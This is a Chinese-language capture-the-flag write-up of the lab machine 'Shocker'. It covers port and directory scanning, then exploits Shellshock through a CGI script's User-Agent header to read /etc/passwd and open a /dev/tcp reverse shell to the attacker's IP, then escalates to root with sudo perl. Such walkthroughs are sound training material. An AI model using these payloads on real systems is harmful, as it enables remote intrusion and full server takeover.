# shocker

```
GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行Shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。此漏洞源于在调用Bash Shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在Shell被调用后会被立即执行。
```

### 

```shell
nmap -vv -sV -sT -A 10.129.85.4
```

```shell
PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/1%OT=80%CT=1%CU=31082%PV=Y%DS=2%DC=T%G=Y%TM=644F2A80
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)SEQ(
OS:SP=105%GCD=1%ISR=108%TI=Z%II=I%TS=8)OPS(O1=M53AST11NW6%O2=M53AST11NW6%O3
OS:=M53ANNT11NW6%O4=M53AST11NW6%O5=M53AST11NW6%O6=M53AST11)WIN(W1=7120%W2=7
OS:120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M53ANNSNW
OS:6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.601 days (since Sun Apr 30 20:31:11 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

对默认端口进行了扫描，开放了80，22端口。

```shell
gobuster dir -u http://10.129.85.4/ -w /usr/share/wordlists/dirb/small.txt
gobuster dir -u http://10.129.85.4/cgi-bin -w /usr/share/wordlists/dirb/small.txt -x sh,pl

```

```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.85.4/cgi-bin
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              sh,pl
[+] Timeout:                 10s
===============================================================
2023/05/01 10:54:28 Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 118]
Progress: 2877 / 2880 (99.90%)
===============================================================
2023/05/01 10:56:21 Finished
===============================================================
                                                                     
```

目录扫描的过程中发现存在/cgi-bin/目录，目录下有个user.sh，继续尝试看看是否存在shellshock漏洞

```
GET /cgi-bin/user.sh HTTP/1.1

Host: 10.129.85.4

User-Agent: () { :; }; echo; /bin/cat /etc/passwd

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Pragma: no-cache

Cache-Control: no-cache



```

```
HTTP/1.1 200 OK

Date: Mon, 01 May 2023 03:28:17 GMT

Server: Apache/2.4.18 (Ubuntu)

Connection: close

Content-Type: text/x-sh

Content-Length: 1567



root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash

```

OK,payload为

```
() { :; }; echo; /bin/cat /etc/passwd
```

### 该`Bash`使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以`(){`开头定义的环境变量在命令`ENV`中解析成函数后，`Bash`执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。

### 将payload插入user-agent，cookie等请求头中，发送请求，发现服务端已经将payload作为bash命令执行了。下一步，我想到的是反弹目标的shell到msf上。

```
GET /cgi-bin/user.sh HTTP/1.1

Host: 10.129.85.4

User-Agent: () { :; }; echo;/bin/sh -i >& /dev/tcp/10.10.16.9/1234 0>&1

Content-Length: 299



Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Pragma: no-cache

Cache-Control: no-cache
```

```
nc -nlvp 1234
```

```
$ pwd   
/usr/lib/cgi-bin
$ cd /
$ ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
$ cd home
$ ls
shelly
$ cd shelly
$ pwd
/home/shelly
$ ls
user.txt
$ cat user.txt
30805fc5d34502c55ba370c803bd5628
```

到此，拿下shelly用户的flag。尝试进一步提权到root

```
sudo -l
sudo perl -e 'exec "/bin/bash";'
whoami
cd /root
cat root.txt
```










